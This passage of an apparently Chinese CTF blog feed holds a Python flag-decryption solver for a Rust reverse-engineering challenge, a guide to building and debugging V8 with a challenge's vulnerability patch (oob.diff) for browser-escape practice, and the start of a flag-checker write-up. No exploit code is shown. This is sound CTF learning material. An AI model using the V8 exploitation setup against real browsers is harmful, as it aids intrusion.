class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data: <span class="built_in">list</span>, table: <span class="built_in">dict</span></span>):</span><br><span class="line">    tmp=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        tmp.append(table[i])</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_order</span>(<span class="params">data:<span class="built_in">list</span>, table: <span class="built_in">list</span></span>):</span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        tmp.append(data[table[i]])</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def de_cmp(x):</span></span><br><span class="line"><span class="string">    r12 = 0x0000000464C457F</span></span><br><span class="line"><span class="string">    r13 = 0x0000000746F6F72</span></span><br><span class="line"><span class="string">    r14 = 0x000000031F3831F</span></span><br><span class="line"><span class="string">    x ^= r14</span></span><br><span class="line"><span class="string">    x = ~x</span></span><br><span class="line"><span class="string">    x = (x &lt;&lt; 11) | (x &gt;&gt; (32 - 11))</span></span><br><span class="line"><span class="string">    x ^= r13</span></span><br><span class="line"><span class="string">    x -= r12</span></span><br><span class="line"><span class="string">    print(hex(x))</span></span><br><span class="line"><span class="string">    return [x &amp; 0xff, (x &amp; 0xff00) &gt;&gt; 8, (x &amp; 0xff0000) &gt;&gt; 16, (x &amp; 0xff000000) &gt;&gt; 24]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de_cmp</span>(<span class="params">x</span>):</span><br><span class="line">    r12 = <span class="number">0x0000000464C457F</span></span><br><span class="line">    r13 = <span class="number">0x0000000746F6F72</span></span><br><span class="line">    r14 = <span class="number">0x000000031F3831F</span></span><br><span class="line"></span><br><span class="line">    x = np.uint32(x)</span><br><span class="line">    x = np.uint32(x ^ r14)</span><br><span class="line">    x = np.uint32(~x)</span><br><span class="line">    x = np.uint32((x &lt;&lt; <span class="number">11</span>) | (x &gt;&gt; (<span class="number">32</span> - <span class="number">11</span>)))</span><br><span class="line">    x = np.uint32(x ^ r13)</span><br><span class="line">    x = np.uint32(x - r12)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(x))</span><br><span class="line">    x = np.int32(x)</span><br><span class="line">    <span class="keyword">return</span> [x &amp; <span class="number">0xff</span>, (x &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span>, (x &amp; <span class="number">0xff0000</span>) &gt;&gt; <span class="number">16</span>, (x &amp; <span class="number">0xff000000</span>) &gt;&gt; <span class="number">24</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># get crypto table</span></span><br><span class="line">s0_255 = [<span class="number">0xFB</span>, <span class="number">0x7B</span>, <span class="number">0x4E</span>, <span class="number">0xBB</span>, <span class="number">0x51</span>, <span class="number">0x15</span>, <span class="number">0x8D</span>, <span class="number">0xDB</span>, <span class="number">0xB0</span>, <span class="number">0xAC</span>, <span class="number">0xA5</span>, <span class="number">0x8E</span>, <span class="number">0xAA</span>, <span class="number">0xB2</span>, <span class="number">0x60</span>, <span class="number">0xEB</span>, <span class="number">0x63</span>, <span class="number">0x5C</span>, <span class="number">0xDE</span>, <span class="number">0x42</span>, <span class="number">0x2B</span>, <span class="number">0xC6</span>, <span class="number">0xA6</span>, <span class="number">0x35</span>, <span class="number">0x30</span>, <span class="number">0x43</span>, <span class="number">0xD6</span>, <span class="number">0x5F</span>, <span class="number">0xBD</span>, <span class="number">0x24</span>, <span class="number">0xB1</span>, <span class="number">0xE3</span>, <span class="number">0x8C</span>, <span class="number">0xA7</span>, <span class="number">0xD5</span>, <span class="number">0x2A</span>, <span class="number">0x7C</span>, <span class="number">0x6D</span>, <span class="number">0x8B</span>, <span class="number">0x17</span>, <span class="number">0x9D</span>, <span class="number">0x83</span>, <span class="number">0xFE</span>, <span class="number">0x69</span>, <span class="number">0x10</span>, <span class="number">0x59</span>, <span class="number">0xA9</span>, <span class="number">0x9E</span>, <span class="number">0x0F</span>, <span class="number">0x1C</span>, <span class="number">0x66</span>, <span class="number">0x97</span>, <span class="number">0x5B</span>, <span class="number">0x61</span>, <span class="number">0xED</span>, <span class="number">0xAD</span>, <span class="number">0xE0</span>, <span class="number">0xDA</span>, <span class="number">0x27</span>, <span class="number">0x06</span>, <span class="number">0x25</span>, <span class="number">0xDC</span>, <span class="number">0x5E</span>, <span class="number">0xE7</span>,</span><br><span class="line">        <span class="number">0x41</span>, <span class="number">0x32</span>, <span class="number">0xD2</span>, <span class="number">0xD9</span>, <span class="number">0x8F</span>, <span class="number">0xEE</span>, <span class="number">0xAF</span>, <span class="number">0x03</span>, <span class="number">0x93</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0xA2</span>, <span class="number">0xE1</span>, <span class="number">0xB3</span>, <span class="number">0xEC</span>, <span class="number">0x81</span>, <span class="number">0x9F</span>, <span class="number">0xCA</span>, <span class="number">0x58</span>, <span class="number">0xB7</span>, <span class="number">0x79</span>, <span class="number">0xFD</span>, <span class="number">0x3B</span>, <span class="number">0xA0</span>, <span class="number">0x02</span>, <span class="number">0x0C</span>, <span class="number">0xCB</span>, <span class="number">0xA8</span>, <span class="number">0x80</span>, <span class="number">0xC0</span>, <span class="number">0x16</span>, <span class="number">0x4D</span>, <span class="number">0x2F</span>, <span class="number">0x75</span>, <span class="number">0x71</span>, <span class="number">0x0A</span>, <span class="number">0x04</span>, <span class="number">0x39</span>, <span class="number">0xFF</span>, <span class="number">0xC1</span>, <span class="number">0x9C</span>, <span class="number">0xAB</span>, <span class="number">0xEF</span>, <span class="number">0xA4</span>, <span class="number">0xD8</span>, <span class="number">0xE2</span>, <span class="number">0x14</span>, <span class="number">0xC2</span>, <span class="number">0x6C</span>, <span class="number">0x64</span>, <span class="number">0x1E</span>, <span class="number">0x6B</span>, <span class="number">0x7E</span>, <span class="number">0x99</span>, <span class="number">0x2E</span>, <span class="number">0x09</span>, <span class="number">0x0B</span>, <span class="number">0x86</span>, <span class="number">0x74</span>, <span class="number">0x6A</span>, <span class="number">0xC4</span>, <span class="number">0x2D</span>, <span class="number">0x4F</span>, <span class="number">0xF9</span>,</span><br><span class="line">        <span class="number">0xFA</span>, <span class="number">0x94</span>, <span class="number">0xB6</span>, <span class="number">0x1F</span>, <span class="number">0x89</span>, <span class="number">0x6F</span>, <span class="number">0x5D</span>, <span class="number">0xE8</span>, <span class="number">0xEA</span>, <span class="number">0xB5</span>, <span class="number">0x5A</span>, <span class="number">0x65</span>, <span class="number">0x88</span>, <span class="number">0xC5</span>, <span class="number">0x7F</span>, <span class="number">0x77</span>, <span class="number">0x11</span>, <span class="number">0xCF</span>, <span class="number">0xF1</span>, <span class="number">0x1B</span>, <span class="number">0x3F</span>, <span class="number">0xF4</span>, <span class="number">0x48</span>, <span class="number">0x47</span>, <span class="number">0x12</span>, <span class="number">0xE4</span>, <span class="number">0xBA</span>, <span class="number">0xDF</span>, <span class="number">0xE9</span>, <span class="number">0x62</span>, <span class="number">0x6E</span>, <span class="number">0xB4</span>, <span class="number">0x96</span>, <span class="number">0xCD</span>, <span class="number">0x13</span>, <span class="number">0x53</span>, <span class="number">0x4B</span>, <span class="number">0x28</span>, <span class="number">0xD7</span>, <span class="number">0xD1</span>, <span class="number">0x33</span>, <span class="number">0xB8</span>, <span class="number">0xE6</span>, <span class="number">0x7A</span>, <span class="number">0x2C</span>, <span class="number">0x9B</span>, <span class="number">0x29</span>, <span class="number">0x44</span>, <span class="number">0x52</span>, <span class="number">0xF7</span>, <span class="number">0x20</span>, <span class="number">0xF2</span>, <span class="number">0x31</span>, <span class="number">0xD3</span>, <span class="number">0xB9</span>, <span class="number">0x40</span>, <span class="number">0xD0</span>, <span class="number">0x34</span>, <span class="number">0xF5</span>, <span class="number">0x54</span>, <span class="number">0x1A</span>, <span class="number">0x01</span>, <span class="number">0xA1</span>, <span class="number">0x92</span>,</span><br><span class="line">        <span class="number">0xFC</span>, <span class="number">0x85</span>, <span class="number">0x07</span>, <span class="number">0xBE</span>, <span class="number">0xDD</span>, <span class="number">0xBC</span>, <span class="number">0x19</span>, <span class="number">0xF3</span>, <span class="number">0x36</span>, <span class="number">0xF6</span>, <span class="number">0x72</span>, <span class="number">0x98</span>, <span class="number">0x4C</span>, <span class="number">0x7D</span>, <span class="number">0xC7</span>, <span class="number">0xD4</span>, <span class="number">0x45</span>, <span class="number">0x4A</span>, <span class="number">0x9A</span>, <span class="number">0xC3</span>, <span class="number">0x8A</span>, <span class="number">0xE5</span>, <span class="number">0x50</span>, <span class="number">0x46</span>, <span class="number">0xCC</span>, <span class="number">0x68</span>, <span class="number">0x76</span>, <span class="number">0x67</span>, <span class="number">0xC9</span>, <span class="number">0x0E</span>, <span class="number">0x3C</span>, <span class="number">0x57</span>, <span class="number">0xF0</span>, <span class="number">0x22</span>, <span class="number">0xBF</span>, <span class="number">0x26</span>, <span class="number">0x84</span>, <span class="number">0x0D</span>, <span class="number">0x90</span>, <span class="number">0xA3</span>, <span class="number">0xAE</span>, <span class="number">0x3D</span>, <span class="number">0x1D</span>, <span class="number">0xC8</span>, <span class="number">0x91</span>, <span class="number">0x05</span>, <span class="number">0x87</span>, <span class="number">0x70</span>, <span class="number">0x08</span>, <span class="number">0x73</span>, <span class="number">0x21</span>, <span class="number">0x49</span>, <span class="number">0x55</span>, <span class="number">0x3E</span>, <span class="number">0x37</span>, <span class="number">0x23</span>, <span class="number">0x18</span>, <span class="number">0x56</span>, <span class="number">0xCE</span>, <span class="number">0x82</span>, <span class="number">0x38</span>, <span class="number">0x95</span>, <span class="number">0x78</span>, <span class="number">0xF8</span>]</span><br><span class="line"></span><br><span class="line">crypto_table = <span class="built_in">dict</span>(<span class="built_in">zip</span>(s0_255,<span class="built_in">range</span>(<span class="number">0x100</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#get order table</span></span><br><span class="line">source = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;&#x27;</span></span><br><span class="line">replaced = <span class="string">&#x27;HfVl&#123;qPcCYNMoRi6D7Jr&#125;espOL3FhwdWAtTGZba4Ugjvnx1QkKE2IS9yuz5BX08m&#x27;</span></span><br><span class="line">revsere_table = [] <span class="comment">#index是source在replace中的下标</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> source:</span><br><span class="line">    revsere_table.append(replaced.find(i))</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(crypto_table)</span></span><br><span class="line"><span class="comment">#print(revsere_table)</span></span><br><span class="line"></span><br><span class="line">cmp_data = [<span class="number">0x526851A7</span>, <span class="number">0x31FF2785</span>, <span class="number">0xC7D28788</span>, <span class="number">0x523F23D3</span>, <span class="number">0xAF1F1055</span>, <span class="number">0x5C94F027</span>, <span class="number">0x797A3FCD</span>, <span class="number">0xE7F02F9F</span>, <span class="number">0x3C86F045</span>, <span class="number">0x6DEAB0F9</span>, <span class="number">0x91F74290</span>, <span class="number">0x7C9A3AED</span>, <span class="number">0xDC846B01</span>, <span class="number">0x0743C86C</span>, <span class="number">0xDFF7085C</span>, <span class="number">0xA4AEE3EB</span>]</span><br><span class="line"></span><br><span class="line">tmp = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cmp_data:</span><br><span class="line">    tmp+=de_cmp(i)</span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    tmp = decrypt(tmp, crypto_table)</span><br><span class="line">    tmp = reverse_order(tmp, revsere_table)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> tmp))</span><br></pre></td></tr></table></figure><p>cmp_data直接提取dest数据就可以了，因为比较数据是固定的</p><p>总结：这道题学到了不少，学到了flag换位加密用固定表紧跟着第二次加密（64），在第二次加密的时候输入的字符和代码行为没有任何关系，所以采用了映射字母表查询（第一次用到这个方法）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;前言：很有意思一道Reverse题，在位移加密有很多巧妙方法，这里记录下做题的过程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这道题学到了很多东西呜呜呜，本篇记录下调试当中的一些技巧方法和参照3cly师傅的博客一些加密的骚操作&lt;/p&gt;
&lt;p&gt;此题是个rust 逆向题，</summary>
      
    
    
    
    
    <category term="Reverse" scheme="https://jsjsj.top/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>V8 escape环境搭建(一)</title>
    <link href="https://jsjsj.top/2023/10/05/V8escape%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>https://jsjsj.top/2023/10/05/V8escape%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</id>
    <published>2023-10-05T12:33:50.000Z</published>
    <updated>2023-10-06T09:49:04.000Z</updated>
    
    <content type="html"><![CDATA[<p>以后想准备深入研究v8，这里先把环境搭建下和一些看到v8类型的题如何处理的过程，</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><strong>虚拟机版本为 ubuntu 18.04</strong></p><p>1.编译 v8</p><p>先下载chrom开发工具depot_tools,它用来进行v8编译，类似gcc</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br></pre></td></tr></table></figure><p>然后把它添加到环境变量里</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:&lt;path to depot_tools&gt;</span><br></pre></td></tr></table></figure><p>然后挂代理（不挂代理的话后面fetch v8和依赖会被墙毕竟是google），</p><p>安装ninja报错，将版本调到138bff28，将DEPOT_TOOLS_UPDATE设置为0，然后gclient</p><p>这个一定要执行，不然后面ninja报错导致环境搭建不起来（一定要执行！！，做题的时候，在拉去版本之前也要执行）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard 138bff28</span><br><span class="line"><span class="built_in">export</span> DEPOT_TOOLS_UPDATE=0</span><br><span class="line">gclient</span><br></pre></td></tr></table></figure><p>下一步下载v8</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fetch v8</span><br><span class="line">或者fetch --force v8</span><br></pre></td></tr></table></figure><p>然后进入到v8目录下，如果在比赛中这里会根据题目给的版本进行git checkout 版本，第二步<code>gclient sync -D</code> 下载相关依赖，<code>-D</code> 会删除不需要的依赖</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> v8</span><br><span class="line">git checkout  7.6.303.28</span><br><span class="line">gclient <span class="built_in">sync</span> -D</span><br></pre></td></tr></table></figure><p>报错的话就执行这句：gclient config <a href="https://chromium.googlesource.com/v8/v8">https://chromium.googlesource.com/v8/v8</a></p><p>下面来介绍题目方法导入</p><p>如果比赛给了一个Chrome浏览器，我🚪可以在浏览器里输入<code>chrome://version</code> 查看版本</p><p>然后打开 github 的 <a href="https://github.com/chromium/chromium">chrome</a> 项目，搜索版本号并切换至相应版本。</p><p><img src="/images/v8image/1.png"></p><p>然后在项目根目录下的 <code>DEPS</code> 文件中查看 <code>V8</code> 版本：</p><p><img src="/images/v8image/2.png"></p><p>如果题目给了 <code>diff</code> 文件需要将 patch 到项目中。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git apply ./oob.diff</span><br></pre></td></tr></table></figure><p>diff文件patch项目里在v8目录下，然后安装相关依赖（如果遇到下载字体未响应问题需要添加 <code>--no-chromeos-fonts</code> 参数），每次运行不同版本都要安装依赖（也就是不同题版本会不一样），这样gdb使用调试的时候就不会报错了</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./build/install-build-deps.sh</span><br><span class="line">或者./build/install-build-deps.sh --no-chromeos-fonts</span><br></pre></td></tr></table></figure><p>下面开始编译v8，选择release版本，因为debug版本在进行漏洞调试会有检测，一般都是用release</p><p>编译v8：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./tools/dev/gm.py x64.release</span><br></pre></td></tr></table></figure><p>编译生成的 <code>d8</code> 在 <code>./out/x64.release/d8</code> 中。</p><h3 id="题目拉取方法，以2019-oob为例"><a href="#题目拉取方法，以2019-oob为例" class="headerlink" title="题目拉取方法，以2019 oob为例"></a>题目拉取方法，以2019 oob为例</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard 138bff28</span><br><span class="line"><span class="built_in">export</span> DEPOT_TOOLS_UPDATE=0</span><br><span class="line">gclient</span><br><span class="line">fetch v8 之前fetch就执行fetch --force v8</span><br><span class="line"><span class="built_in">cd</span> v8</span><br><span class="line">git reset --hard 6dc88c191f5ecc5389dc26efa3ca0907faef3598<span class="comment">#设置v8分支</span></span><br><span class="line">gclient <span class="built_in">sync</span></span><br><span class="line">git apply ../oob.diff</span><br><span class="line">./build/install-build-deps.sh --no-chromeos-fonts</span><br><span class="line">tools/dev/gm.py x64.release</span><br></pre></td></tr></table></figure><h3 id="调试-v8"><a href="#调试-v8" class="headerlink" title="调试 v8"></a>调试 v8</h3><p>在 <code>~/.gdbinit</code> 添加 <code>v8</code> 的调试插件：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> /path/to/v8/tools/gdbinit</span><br><span class="line"><span class="built_in">source</span> /path/to/v8/gdb-v8-support.py</span><br></pre></td></tr></table></figure><p>&#x2F;path&#x2F;to&#x2F;是自己到达v8目录的一些路径</p><p>常见参数：</p><p>–allow-natives-syntax 开启原生API (用的比较多)<br>–trace-turbo 跟踪生成TurboFan IR<br>–print-bytecode 打印生成的bytecode<br>–shell 运行脚本后切入交互模式<br>更多参数可以参考 –help<br>调试 js 脚本时可以采用如下命令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb ./d8</span><br><span class="line">r --allow-natives-syntax --shell ./exp.js</span><br></pre></td></tr></table></figure><p>js中常见的⼀些调试技巧：</p><p>在js中写⼊断点：**%SystemBreak();** ，如果不在调试模式的话, 程序直接中断, 如果在调试器中, 会被调试器识别到<br>并且断下来。<br>打印出对象的地址和对应的信息: <strong>%DebugPrint(var_name);</strong><br>调试时输入 <strong>job + DebugPrint</strong>打印的对象地址 可以打印出对象的结构。</p><h3 id="安装-turbolizer"><a href="#安装-turbolizer" class="headerlink" title="安装 turbolizer"></a>安装 turbolizer</h3><p><code>turbolizer</code> 是一个可视化分析 JS 优化的工具，安装命令如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /path/to/v8/tools/turbolizer</span><br><span class="line">sudo npm install n -g</span><br><span class="line">sudo n 16.20.0</span><br><span class="line">sudo npm i</span><br><span class="line">sudo npm run-script build</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由于 Ubuntu18.04 默认的 <code>node</code> 版本过低，需要安装 <code>16.20.0</code> 版本。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo npm i</span><br></pre></td></tr></table></figure><p>最后需要启动一个 web 服务器，根据需要 8000 可以换成其它端口。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8000</span><br></pre></td></tr></table></figure><p>编写一个 js 脚本：<br><code>%OptimizeFunctionOnNextCall</code> 内置函数可以直接触发强行触发优化。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//%OptimizeFunctionOnNextCall(add);</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10000000</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">add</span>(i, i + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行 js 脚本并使用 <code>--trace-turbo</code> 参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./d8 --trace-turbo --allow-natives-syntax ./test.js</span><br></pre></td></tr></table></figure><p>在浏览器中访问 <code>http://127.0.0.1:8000/path/to/v8/tools/turbolizer/</code> ，然后在其中打开该文件就可以进行分析。</p><p>先占个坑稍后来补全。。。。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;以后想准备深入研究v8，这里先把环境搭建下和一些看到v8类型的题如何处理的过程，&lt;/p&gt;
&lt;h2 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;虚拟机版本为</summary>
      
    
    
    
    <category term="pwn" scheme="https://jsjsj.top/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://jsjsj.top/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2023 xxx比赛关于学弟给的Rev wp</title>
    <link href="https://jsjsj.top/2023/10/04/wp/"/>
    <id>https://jsjsj.top/2023/10/04/wp/</id>
    <published>2023-10-04T11:25:24.000Z</published>
    <updated>2023-10-13T08:28:18.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>关于xxxx比赛xxx学弟xxxx时间给了xxxx两个道re题，👴开了下题不难，就是写脚本老是报错，g</strong></p><p><strong>这两天学弟给了两道Rev题，重温下当年的re味道，re都不难，随便水一个博客文章（毕竟博客刚创建没多久，没文章可发），直接给题代码和exp</strong></p><h2 id="Reverse-wp"><a href="#Reverse-wp" class="headerlink" title="Reverse wp"></a>Reverse wp</h2><h3 id="ezxz3-xxx附件名"><a href="#ezxz3-xxx附件名" class="headerlink" title="ezxz3 xxx附件名"></a>ezxz3 xxx附件名</h3><p>题目源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Please input flag:&quot;</span>)</span><br><span class="line">flag = <span class="built_in">input</span>()</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(flag)!=<span class="number">42</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Check your length!&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">l=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    s=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flag[i*<span class="number">7</span>:i*<span class="number">7</span>+<span class="number">7</span>]:</span><br><span class="line">        s+=<span class="built_in">hex</span>(<span class="built_in">ord</span>(j))[<span class="number">2</span>:]</span><br><span class="line">    l.append(<span class="built_in">int</span>(s,<span class="number">16</span>))</span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">(<span class="number">593</span>*l[<span class="number">0</span>] + <span class="number">997</span>*l[<span class="number">1</span>] + <span class="number">811</span>*l[<span class="number">2</span>] + <span class="number">258</span>*l[<span class="number">3</span>] + <span class="number">829</span>*l[<span class="number">4</span>] + <span class="number">532</span>*l[<span class="number">5</span>])== <span class="number">0x5b8e0aef71d34ff43</span> <span class="keyword">and</span> \</span><br><span class="line">(<span class="number">605</span>*l[<span class="number">0</span>] + <span class="number">686</span>*l[<span class="number">1</span>] + <span class="number">328</span>*l[<span class="number">2</span>] + <span class="number">602</span>*l[<span class="number">3</span>] + <span class="number">695</span>*l[<span class="number">4</span>] + <span class="number">576</span>*l[<span class="number">5</span>])== <span class="number">0x551a262360964ef7f</span> <span class="keyword">and</span> \</span><br><span class="line">(<span class="number">373</span>*l[<span class="number">0</span>] + <span class="number">512</span>*l[<span class="number">1</span>] + <span class="number">449</span>*l[<span class="number">2</span>] + <span class="number">756</span>*l[<span class="number">3</span>] + <span class="number">448</span>*l[<span class="number">4</span>] + <span class="number">580</span>*l[<span class="number">5</span>])== <span class="number">0x49d158a5657d6931c</span> <span class="keyword">and</span> \</span><br><span class="line">(<span class="number">560</span>*l[<span class="number">0</span>] + <span class="number">635</span>*l[<span class="number">1</span>] + <span class="number">422</span>*l[<span class="number">2</span>] + <span class="number">971</span>*l[<span class="number">3</span>] + <span class="number">855</span>*l[<span class="number">4</span>] + <span class="number">597</span>*l[<span class="number">5</span>])== <span class="number">0x625568d5abbabf4f3</span> <span class="keyword">and</span> \</span><br><span class="line">(<span class="number">717</span>*l[<span class="number">0</span>] + <span class="number">507</span>*l[<span class="number">1</span>] + <span class="number">388</span>*l[<span class="number">2</span>] + <span class="number">925</span>*l[<span class="number">3</span>] + <span class="number">324</span>*l[<span class="number">4</span>] + <span class="number">524</span>*l[<span class="number">5</span>])== <span class="number">0x50ee0c025e70e3c23</span> <span class="keyword">and</span> \</span><br><span class="line">(<span class="number">312</span>*l[<span class="number">0</span>] + <span class="number">368</span>*l[<span class="number">1</span>] + <span class="number">884</span>*l[<span class="number">2</span>] + <span class="number">518</span>*l[<span class="number">3</span>] + <span class="number">495</span>*l[<span class="number">4</span>] + <span class="number">414</span>*l[<span class="number">5</span>])== <span class="number">0x40e735f8aa2815f65</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Good job!&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Wrong\nTry again!!!&quot;</span>)</span><br><span class="line">    exit()</span><br></pre></td></tr></table></figure><p>分析源码，直接用z3 设置约束条件跑就行了，注意最后取数据的时候，exp.py:</p><figure 